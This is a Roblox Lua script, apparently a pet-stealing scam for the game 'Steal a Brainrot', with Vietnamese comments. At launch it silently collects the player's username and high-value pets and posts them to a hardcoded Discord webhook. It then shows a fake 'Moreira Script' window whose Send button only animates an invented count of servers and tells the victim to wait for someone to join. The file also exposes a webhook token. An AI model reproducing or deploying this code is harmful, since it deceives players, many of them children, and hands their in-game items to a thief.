local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local USERNAME = player and player.Name or "Unknown"
local WEBHOOK = "https://discord.com/api/webhooks/1428242007066939443/p341LK7jNUEoKNu4V2zy3dS41MRmBzcBZeMBJA1UrdtumaTfaY3qXk5q1eJqMF6rhqIS"
local PRICE_LIMIT = 10e6 -- 15M (gi·ªØ nguy√™n, ƒë·ªïi n·∫øu c·∫ßn)

-- üßÆ parse gi√° tr·ªã
local function parsePrice(priceText)
	local number = tonumber((priceText or ""):match("[%d%.]+")) or 0
	priceText = string.upper(priceText or "")
	if priceText:find("K") then
		return number * 1e3
	elseif priceText:find("M") then
		return number * 1e6
	elseif priceText:find("B") then
		return number * 1e9
	else
		return number
	end
end

-- üß≠ x√°c ƒë·ªãnh t·∫ßng g·∫ßn nh·∫•t (ƒë√£ fix Base l√† Model ho·∫∑c Part)
local function getNearestFloor(plot, model)
	local podiums = plot:FindFirstChild("AnimalPodiums")
	if not podiums then return "? Floor" end

	local closest = math.huge  
	local floor = "? Floor"  

	for _, podium in pairs(podiums:GetChildren()) do  
		if podium:IsA("Model") then  
			local basePart = podium:FindFirstChild("Base")  
			if not (basePart and basePart:IsA("BasePart")) then  
				for _, sub in pairs(podium:GetDescendants()) do  
					if sub:IsA("BasePart") then  
						basePart = sub  
						break  
					end  
				end  
			end  

			if basePart then  
				local success, dist = pcall(function()  
					return (basePart.Position - model:GetPivot().Position).Magnitude  
				end)  
				if success and dist < closest then  
					closest = dist  
					local num = tonumber(podium.Name:match("^(%d+)_?"))  
					if num then  
						if num >= 1 and num <= 10 then  
							floor = "1st Floor"  
						elseif num <= 18 then  
							floor = "2nd Floor"  
						else  
							floor = "3rd Floor"  
						end  
					end  
				end  
			end  
		end  
	end  

	return floor
end

-- üîç t√¨m overhead trong FakeRootPart (ƒë·ªá quy to√†n b·ªô)
local function findOverheadsInPart(part)
	local result = {}
	if part:IsA("Attachment") then
		local oh = part:FindFirstChild("AnimalOverhead")
		if oh then table.insert(result, oh) end
	end
	for _, c in pairs(part:GetChildren()) do
		local sub = findOverheadsInPart(c)
		for _, s in pairs(sub) do table.insert(result, s) end
	end
	return result
end

-- üì¶ thu th·∫≠p model ƒë·∫∑c bi·ªát (l·ªçc theo gi√° tr·ªã Generation)
local function collectSpecialModels()
	local pets = {}
	local plots = Workspace:FindFirstChild("Plots")
	if not plots then return pets end

	for _, plot in pairs(plots:GetChildren()) do  
		local sign = plot:FindFirstChild("PlotSign")  
		if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then  
			for _, model in pairs(plot:GetChildren()) do  
				if model:IsA("Model") and model:FindFirstChild("FakeRootPart") and not model.Name:lower():find("friendpanel") then  
					local fakeRoot = model.FakeRootPart  
					local floor = getNearestFloor(plot, model)  
					for _, overhead in pairs(findOverheadsInPart(fakeRoot)) do  
						local name = overhead:FindFirstChild("DisplayName")  
						local gen = overhead:FindFirstChild("Generation")  
						if name and gen and name:IsA("TextLabel") and gen:IsA("TextLabel") then  
							local genValue = parsePrice(gen.Text)
							if genValue >= PRICE_LIMIT then
								table.insert(pets, string.format("%s (%s) (%s)", name.Text, gen.Text, floor))
							end
						end  
					end  
				end  
			end  
			break -- ch·ªâ x√©t base c·ªßa m√¨nh  
		end  
	end  
	return pets
end

-- üì® g·ª≠i webhook text ƒë∆°n gi·∫£n (bao g·ªìm USERNAME)
local function sendWebhook()
	local specialPets = collectSpecialModels()
	if #specialPets == 0 then
		warn("‚ö†Ô∏è Kh√¥ng c√≥ pet n√†o ƒë·ªß gi√° tr·ªã ‚â• " .. (PRICE_LIMIT/1e6) .. "M, kh√¥ng g·ª≠i webhook.")
		return
	end

	local lootText = table.concat(specialPets, "\n")
	-- Th√™m t√™n ng∆∞·ªùi d√πng v√†o n·ªôi dung
	local content = string.format("@everyone SPECIAL MODEL FOUND!!!\nüß† Brainrot Loot by %s\n%s", USERNAME, lootText)

	local payload = {content = content}  
	local req = (syn and syn.request) or http_request or (http and http.request) or request  
	if req and WEBHOOK and type(WEBHOOK) == "string" and WEBHOOK ~= "" then  
		local ok, err = pcall(function()  
			req({  
				Url = WEBHOOK,  
				Method = "POST",  
				Headers = {["Content-Type"] = "application/json"},  
				Body = HttpService:JSONEncode(payload)  
			})  
		end)  
		if ok then  
			print("‚úÖ Webhook Sent!")  
		else  
			warn("‚ùå Webhook Error:", err)  
		end  
	else  
		warn("‚ö†Ô∏è No valid request function or webhook URL.")  
	end
end

-- üîÑ Ch·∫°y
sendWebhook()

local TweenService = game:GetService("TweenService")

local playerGui = player:WaitForChild("PlayerGui")

-- X√≥a GUI c≈© n·∫øu c√≥
local oldGui = playerGui:FindFirstChild("MoreiraGUI")
if oldGui then oldGui:Destroy() end

-- GUI ch√≠nh
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MoreiraGUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- Frame ch√≠nh
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 320, 0, 180)
frame.Position = UDim2.new(0.5, -160, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- üîπ Title
local title = Instance.new("TextLabel")
title.Text = "Moreira Script"
title.Font = Enum.Font.FredokaOne
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 10, 0, 6)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

-- ‚ùå N√∫t X (ƒë√≥ng GUI ch√≠nh)
local closeMainBtn = Instance.new("TextButton")
closeMainBtn.Text = "‚ùå"
closeMainBtn.Font = Enum.Font.FredokaOne
closeMainBtn.TextSize = 20
closeMainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeMainBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
closeMainBtn.Size = UDim2.new(0, 28, 0, 28)
closeMainBtn.Position = UDim2.new(1, -34, 0, 6)
closeMainBtn.Parent = frame
Instance.new("UICorner", closeMainBtn)

closeMainBtn.MouseButton1Click:Connect(function()
	screenGui:Destroy()
end)

-- üîπ Status
local status = Instance.new("TextLabel")
status.Text = "Status: üî¥ Wait for request"
status.Font = Enum.Font.FredokaOne
status.TextSize = 16
status.TextColor3 = Color3.fromRGB(255, 255, 180)
status.BackgroundTransparency = 1
status.Size = UDim2.new(1, -20, 0, 20)
status.Position = UDim2.new(0, 10, 0, 50)
status.TextXAlignment = Enum.TextXAlignment.Left
status.Parent = frame

-- üîπ N√∫t Send
local sendBtn = Instance.new("TextButton")
sendBtn.Text = "Send"
sendBtn.Font = Enum.Font.FredokaOne
sendBtn.TextSize = 18
sendBtn.TextColor3 = Color3.fromRGB(40, 40, 40)
sendBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
sendBtn.Size = UDim2.new(0, 280, 0, 45)
sendBtn.Position = UDim2.new(0.5, -140, 0, 90)
sendBtn.Parent = frame
Instance.new("UICorner", sendBtn)

-- üîπ Footer
local footer = Instance.new("TextLabel")
footer.Text = "Meow Script | Enjoy it"
footer.Font = Enum.Font.FredokaOne
footer.TextSize = 14
footer.TextColor3 = Color3.fromRGB(180, 180, 180)
footer.BackgroundTransparency = 1
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -25)
footer.Parent = frame

-- ================== GUI g·ª≠i ==================
local sendingGui = Instance.new("Frame")
sendingGui.Size = UDim2.new(0, 360, 0, 140)
sendingGui.Position = UDim2.new(0.5, -180, 0.5, -70)
sendingGui.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
sendingGui.Visible = false
sendingGui.Active = true
sendingGui.Draggable = true
sendingGui.ZIndex = 100
sendingGui.Parent = screenGui
Instance.new("UICorner", sendingGui).CornerRadius = UDim.new(0, 12)

-- ‚ùå N√∫t X (ƒë√≥ng GUI g·ª≠i)
local closeSendBtn = Instance.new("TextButton")
closeSendBtn.Text = "‚ùå"
closeSendBtn.Font = Enum.Font.FredokaOne
closeSendBtn.TextSize = 20
closeSendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeSendBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
closeSendBtn.Size = UDim2.new(0, 30, 0, 30)
closeSendBtn.Position = UDim2.new(1, -38, 0, 5)
closeSendBtn.ZIndex = 102
closeSendBtn.Parent = sendingGui
Instance.new("UICorner", closeSendBtn)

closeSendBtn.MouseButton1Click:Connect(function()
	sendingGui:Destroy()
end)

-- Label ch√≠nh
local sendingLabel = Instance.new("TextLabel")
sendingLabel.Size = UDim2.new(1, -20, 1, -40)
sendingLabel.Position = UDim2.new(0, 10, 0, 25)
sendingLabel.BackgroundTransparency = 1
sendingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
sendingLabel.Font = Enum.Font.FredokaOne
sendingLabel.TextSize = 18
sendingLabel.TextWrapped = true
sendingLabel.Text = "Sent to 0 servers, please wait about 50s"
sendingLabel.ZIndex = 101
sendingLabel.Parent = sendingGui

-- ================== Logic g·ª≠i ==================
local busy = false
sendBtn.MouseButton1Click:Connect(function()
	if busy then return end
	busy = true

	status.Text = "Status: üü° Pending"
	local activeDots = true

	task.spawn(function()
		local dots = ""
		while activeDots do
			dots = dots == "..." and "" or dots .. "."
			status.Text = "Status: üü° Pending" .. dots
			task.wait(0.4)
		end
	end)

	sendingGui.BackgroundTransparency = 1
	sendingGui.Visible = true
	TweenService:Create(sendingGui, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()

	local targetServers = math.random(1500, 2500)
	local totalTicks = 500
	local current = 0

	for i = 1, totalTicks do
		current = math.floor(targetServers * (i / totalTicks))
		sendingLabel.Text = string.format("Sending to %d servers, please wait about 50s", current)
		task.wait(0.1)
	end

	activeDots = false
	status.Text = "Status: üü¢ Sent, wait for someone to join"
	sendingLabel.Text = string.format("Sent to %d servers successfully!", targetServers)

	task.wait(3)
	if sendingGui and sendingGui.Parent then
		TweenService:Create(sendingGui, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
		task.wait(0.5)
		if sendingGui then sendingGui:Destroy() end
	end

	busy = false
end)
